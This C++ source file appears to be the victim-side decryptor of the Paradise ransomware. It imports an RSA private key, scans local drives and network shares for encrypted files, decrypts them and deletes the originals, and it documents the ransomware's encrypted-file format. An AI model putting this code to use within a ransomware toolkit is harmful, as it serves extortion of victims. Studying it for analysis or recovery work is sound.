#include "../Api.h"
#include "resource.h"

HWND Dialog;
HCRYPTKEY rsa_key = NULL;
HCRYPTPROV prov = NULL;
Decrypt_Data* data = NULL;
int encodedFiles = 0;
bool decrypting = false;

char* ChooseFile()
{
	char curdir[MAX_PATH];
	char *filepath = (char*)GlobalAlloc(GMEM_FIXED, MAX_PATH);
	GetCurrentDirectory(MAX_PATH, curdir);
	OPENFILENAME ofn;
	Mem::Zero(&ofn, sizeof(OPENFILENAME));
	ofn.lpstrInitialDir = curdir;
	ofn.lStructSize = sizeof(ofn);
	ofn.lpstrFile = filepath;
	*(ofn.lpstrFile) = 0;
	ofn.nMaxFile = MAX_PATH;
	ofn.lpstrFilter = "Any file";
	ofn.nMaxFileTitle = sizeof(filepath);
	if (GetOpenFileName(&ofn))
		return filepath;
	return NULL;
}

aes_key_t* get_aes_key(HCRYPTPROV prov, HCRYPTKEY rsa_key, const char *file)
{
	key_hdr key;
	aes_key_t* aes_key = (aes_key_t*)Mem::Alloc(sizeof(aes_key_t));
	if (file)
	{
		FILE* in = Funcs::_fopen(file, "rb");
		if (in) {
			// пропускаем сигнатуру и размер, переходим к зашифрованному ключу
			Funcs::_fseek(in, WC_SIG_LEN + sizeof(int), SEEK_SET);
			key.len = Funcs::_fread(aes_key->enc, 1, WC_ENCKEY_LEN, in);
			// расшифровываем aes приват ключом
			if (!CryptDecrypt(rsa_key, 0, TRUE, 0, aes_key->enc, &key.len))
			{
				Mem::Free(aes_key);
				return NULL;
			}
			// копируем расшифрованный aes ключ в заголовок для CryptImportKey
			Mem::Copy(key.key, aes_key->enc, WC_AES_KEY_LEN);
			Funcs::_fclose(in);
		}
		else
			return NULL;
	}
	key.hdr.bType = PLAINTEXTKEYBLOB;
	key.hdr.bVersion = CUR_BLOB_VERSION;
	key.hdr.reserved = 0;
	key.hdr.aiKeyAlg = CALG_AES_128;
	key.len = WC_AES_KEY_LEN;
	if (CryptImportKey(prov, (PBYTE)&key, sizeof(key), 0, CRYPT_NO_SALT, &aes_key->key))
	{
		DWORD mode = CRYPT_MODE_CBC;
		CryptSetKeyParam(aes_key->key, KP_MODE, (PBYTE)&mode, 0);
	}
	return aes_key;
}

void FileDecrypt(char *infile)
{
	char outfile[MAX_PATH];
	DWORD dwr;
	DWORD64 dataLen;
	FILE* in = Funcs::_fopen(infile, "rb");
	if (in)
	{
		lstrcpy(outfile, infile);
		char *extStart = StrStr(outfile, Strs::version);
		extStart[0] = '\0';
		HANDLE out = CreateFileA(outfile, GENERIC_WRITE, 0, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
		if (out != INVALID_HANDLE_VALUE)
		{
			// получаем aes-128 ключ для файла
			aes_key_t* aes_key = get_aes_key(prov, rsa_key, infile);
			if (aes_key)
			{
				BYTE* buf = (BYTE*)Mem::Alloc(BLOCK_SIZE);
				// Перемещаемся к размеру файла
				Funcs::_fseek(in, WC_DATA_OFFSET, SEEK_SET);
				// Читаем размер файла, который был до шифрования
				Funcs::_fread(&dataLen, 1, sizeof(DWORD64), in);
				DWORD len = Funcs::_fread(buf, 1, BLOCK_SIZE, in);
				CryptDecrypt(aes_key->key, 0, (len < BLOCK_SIZE), 0, buf, (DWORD*)&len);
				WriteFile(out, buf, len, &dwr, 0);
				while (true)
				{
					len = Funcs::_fread(buf, 1, BLOCK_SIZE, in);
					if (!len)
						break;
					if (data->is_one_block == 0)
						if (!CryptDecrypt(aes_key->key, 0, (len < BLOCK_SIZE), 0, buf, &len))
							break;
					WriteFile(out, buf, len, &dwr, 0);
				}
				if (aes_key->key)
					CryptDestroyKey(aes_key->key);
				Mem::Free(buf);
				Mem::Free(aes_key);
			}
			CloseHandle(out);
		}
		Funcs::_fclose(in);
	}
}

LPSTR* GetNetwork()
{
	LPSTR* Folders = (LPSTR*)Mem::Alloc(MAX_NETWORKS);
	DWORD read, total, rc = ERROR_MORE_DATA, resumeh = 0;
	while (rc == ERROR_MORE_DATA)
	{
		SHARE_INFO_2 *info = NULL;
		rc = NetShareEnum(NULL, 2, (PBYTE*)&info, 8192, &read, &total, &resumeh);
		/*
			Здесь велика вероятность того, что NetShareEnum выставит ошибку 997 (Overlapped I/O operation is in progress.),
			но это никак не влияет на получение путей. Причину такого поведения не выявил.
		*/
		if (rc != ERROR_MORE_DATA && rc != ERROR_SUCCESS)
			break;
		SHARE_INFO_2 *curNetwork = info;
		for (DWORD i = 0; i < read; ++i, ++curNetwork)
		{
			Folders[i] = Mem::Utf16toUtf8(curNetwork->shi2_path);
		}
		if (info)
			NetApiBufferFree(info);
	}
	Folders[read] = 0;
	return Folders;
}

// Если в файле имеется валидный key_hdr, то возвращаемое значение > 0
int IsValid(const char *file)
{
	char  key[WC_ENCKEY_LEN], sig[WC_SIG_LEN];
	DWORD len, keylen, unk;
	DWORD64 datalen;
	int      ok = 0;

	// open archive
	HANDLE in = CreateFile(file, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (in == INVALID_HANDLE_VALUE)
		return ok;
	ReadFile(in, sig, WC_SIG_LEN, &len, 0);
	if (len == WC_SIG_LEN && (Mem::Compare(sig, Strs::paradise_sig, WC_SIG_LEN) == 0))
	{
		ReadFile(in, &keylen, sizeof(keylen), &len, 0);
		if (len == sizeof(keylen) && keylen == WC_ENCKEY_LEN)
		{
			ReadFile(in, key, WC_ENCKEY_LEN, &len, 0);
			if (len == keylen) {
				ReadFile(in, &unk, sizeof(unk), &len, 0);
				if (len == sizeof(unk) && (unk == 3 || unk == 4))
				{
					ReadFile(in, &datalen, sizeof(datalen), &len, 0);
					ok = (len == sizeof(datalen));
				}
			}
		}
	}
	CloseHandle(in);
	return ok;
}

void ScanPC(char* dir)
{
	char iterDir[MAX_PATH + 128];
	wsprintf(iterDir, "%s*", dir);
	WIN32_FIND_DATA iterData;
	HANDLE hIter = FindFirstFileA(iterDir, &iterData);
	if (hIter == INVALID_HANDLE_VALUE)
		return;
	do
	{
		if (iterData.dwFileAttributes == INVALID_FILE_ATTRIBUTES)
			continue;
		char ObjectPath[MAX_PATH + 128];
		wsprintf(ObjectPath, "%s%s", dir, iterData.cFileName);

		if (lstrcmp(iterData.cFileName, ".") == 0 || lstrcmp(iterData.cFileName, "..") == 0)
			continue;

		else if (iterData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			lstrcat(ObjectPath, "\\");
			ScanPC(ObjectPath);
		}
		// зашифровано
		else if (StrStr(iterData.cFileName, data->extension) && StrStr(iterData.cFileName, Strs::version))
		{
			SetDlgItemText(Dialog, IDC_STATIC5, ObjectPath);
			SetDlgItemInt(Dialog, IDC_STATIC7, ++encodedFiles, FALSE);
			if (decrypting)
			{
				if (IsValid(ObjectPath))
				{
					FileDecrypt(ObjectPath);
					DeleteFile(ObjectPath);
				}
			}
		}
	} while (FindNextFileA(hIter, &iterData));
	FindClose(hIter);
}

void GlobalScan()
{
	char *disks = Utils::GetDisks();
	PHANDLE Threads = (PHANDLE)Mem::Alloc(lstrlen(disks) * sizeof(HANDLE));
	int Index;
	for (Index = 0; disks[Index]; ++Index)
	{
		char *disk = (char*)Mem::Alloc(5);
		disk[0] = disks[Index];
		disk[1] = 0;
		lstrcat(disk, ":\\");
		HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ScanPC, disk, 0, 0);
		Threads[Index] = hThread;
	}
	LPSTR* folders = GetNetwork();
	for (; *folders; ++Index, ++folders)
	{
		lstrcat(*folders, "\\");
		HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ScanPC, *folders, 0, 0);
		Threads[Index] = hThread;
	}

	WaitForMultipleObjects(Index, Threads, TRUE, INFINITE);
	Mem::Free(Threads);
	Mem::Free(folders);
	Mem::Free(disks);
	MessageBoxA(0, "Done", "Success", MB_ICONINFORMATION);
}


INT_PTR CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_CLOSE:
		ExitProcess(0);
		break;
	case WM_COMMAND:
		switch (wParam)
		{
		case IDC_BUTTON1:
			ExitProcess(0);
			break;
		case IDC_BUTTON2:
		{
			char filePath[MAX_PATH];
			GetDlgItemText(Dialog, IDC_EDIT2, filePath, sizeof(filePath));
			DWORD attrs = GetFileAttributes(filePath);
			if (!rsa_key)
				MessageBoxA(0, "Key wasn't found", 0, 0);
			else if (attrs != INVALID_FILE_ATTRIBUTES)
			{
				FileDecrypt(filePath);
				DeleteFile(filePath);
			}
			else
			{
				decrypting = true;
				encodedFiles = 0;
				CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GlobalScan, 0, 0, 0);
			}
			break;
		}
		case IDC_BUTTON4:
		{
			char* fileName = ChooseFile();
			SetDlgItemText(Dialog, IDC_EDIT2, fileName);
			break;
		}
		case IDC_BUTTON3:
		{
			encodedFiles = 0;
			decrypting = false;
			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GlobalScan, 0, 0, 0);
			break;
		}
		case IDC_BUTTON5:
		{
			char base64[5000];
			int length = GetDlgItemText(Dialog, IDC_EDIT1, base64, 5000);
			int outLen;
			byte* blob = (BYTE*)Crypt::base64_decode(base64, length, &outLen);
			if (CryptImportKey(prov, blob, outLen, 0, CRYPT_EXPORTABLE, &rsa_key)) MessageBoxA(0, "Key imported", 0, 0);
			else MessageBoxA(0, "Any error occured", 0, 0);
			break;
		}
		}
	}
	return FALSE;
}


void Entry()
{
	InitApi();
	MSG uMsg;
	Dialog = CreateDialogParamA(0, MAKEINTRESOURCE(IDD_DIALOG1), HWND_DESKTOP, DialogProc, 0);
	ShowWindow(Dialog, SW_SHOWNORMAL);
	if (!CryptAcquireContextA(&prov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET | CRYPT_VERIFYCONTEXT))
			MessageBoxA(0, "Can't get context", 0, 0);
	}
	data = (Decrypt_Data*)Utils::ReadInfo();
	/*data = (Decrypt_Data*)Mem::Alloc(sizeof(Decrypt_Data));
	Mem::Copy(data->extension, "testing", 8);
	data->is_one_block = 0;*/
	while (GetMessage(&uMsg, 0, 0, 0))
	{
		if (!IsDialogMessage(Dialog, &uMsg))
		{
			TranslateMessage(&uMsg);
			DispatchMessage(&uMsg);
		}
		else if ((GetKeyState(VK_CONTROL) & 0x8000) && uMsg.wParam == 'A')
		{
			SendMessage(GetFocus(), EM_SETSEL, 0, -1);
		}
	}
}
